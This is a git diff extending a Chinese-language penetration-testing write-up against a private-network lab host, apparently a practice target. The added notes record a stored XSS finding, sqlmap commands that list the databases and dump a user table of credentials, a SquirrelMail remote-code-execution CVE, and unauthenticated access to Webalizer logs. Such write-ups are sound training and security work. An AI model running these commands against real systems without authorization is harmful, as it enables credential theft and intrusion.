@@ -102,7 +102,31 @@ http://172.16.12.102/mail/src/login.php
 
 使用url和base64加密的方式不可行
 
-进行多次测试并未发生登陆次数限制，尝试爆破密码
+进行多次测试并未发生登陆次数限制，尝试爆破密码未果
+
+
+
+登陆界面有个目录是
+
+```
+http://172.16.12.102/admin/inc
+会跳转至
+http://172.16.12.102/admin/inc/blog.php
+```
+
+![image-20220123125826463](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123125826463.png)
+
+反射成功
+
+同时sql语句报错
+
+![image-20220123125857379](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123125857379.png)
+
+```sql
+insert into blog (blog_title, blog_body, blog_date, user_id) values ('', '', now(), )
+```
+
+存在存储性XSS
 
 ## 博客页面看看有什么操作
 
@@ -140,13 +164,33 @@ python sqlmap.py -u "http://172.16.12.102/index.html?page=blog&title=Blog&id=2"
 
 Apache版本 2.2.0，PHP版本5.1.2，Mysql版本5.0.12
 
+```
+python sqlmap.py -u "http://172.16.12.102/index.html?page=blog&title=Blog&id=2" --dbs
+```
+
+![image-20220123134445913](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123134445913.png)
+
+```
+sqlmap -u "http://172.16.12.102/index.html?page=blog&title=Blog&id=2" -D ehks --tables
+```
+
+![image-20220123140934535](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123140934535.png)
+
+```
+sqlmap -u "http://172.16.12.102/index.html?page=blog&title=Blog&id=2" -D ehks -T user --dump
+```
+
+![image-20220123141012920](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123141012920.png)
+
+用户名密码都被爆出
+
 ## 邮件页面看看有什么操作
 
 ![image-20220123023229096](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123023229096.png)
 
 SquirrelMail版本是1.4.17，上网搜一搜
 
-> PHP邮件Squirrelmail远程代码执行漏洞CVE-2017-7692 1.4.22以下版本均受影响
+> PHP邮件Squirrelmail远程代码执行漏洞CVE-2017-7692 1.4.22以下版本均受影响，但需要登陆
 
 可以对其测试
 
@@ -214,3 +258,31 @@ sql语句被报错显示出，单引号没被过滤可以测试
 ![image-20220123030336225](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123030336225.png)
 
 弹出失败
+
+
+
+Calendar页面有个目录
+
+```
+http://172.16.12.102/calendar/adodb/
+```
+
+![image-20220123130055331](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123130055331.png)
+
+adodb数据库异步操作
+
+adodb.inc.php推断是数据库连接信息
+
+## 包含页面看看有什么操作
+
+![image-20220123123750039](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123123750039.png)
+
+header文件中有个目录被注释掉了，/usage目录
+
+打开usage目录后
+
+![image-20220123123905469](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123123905469.png)
+
+使用的Webalizer 版本号2.01-10，是一个Linux日志分析工具
+
+可以直接看到Linux相关日志，是一个未经授权访问
